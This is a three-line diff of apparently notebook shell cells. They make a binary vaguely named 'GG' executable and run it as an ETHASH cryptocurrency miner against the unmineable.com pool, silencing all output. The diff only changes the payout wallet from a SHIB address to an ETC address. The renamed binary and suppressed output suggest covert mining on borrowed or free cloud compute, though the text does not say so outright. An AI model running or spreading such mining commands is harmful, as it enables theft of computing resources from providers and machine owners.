@@ -1,3 +1,3 @@
 ! chmod +rwx GG
-! ./GG --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x6e890745813facaeab2afab23440a04f6b55034a.GPU-1#fg38-pfgk > /dev/null
+! ./GG --algo ETHASH --pool ethash.unmineable.com:3333 --user ETC:0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.GPU-1#bv15-64v8 > /dev/null
 
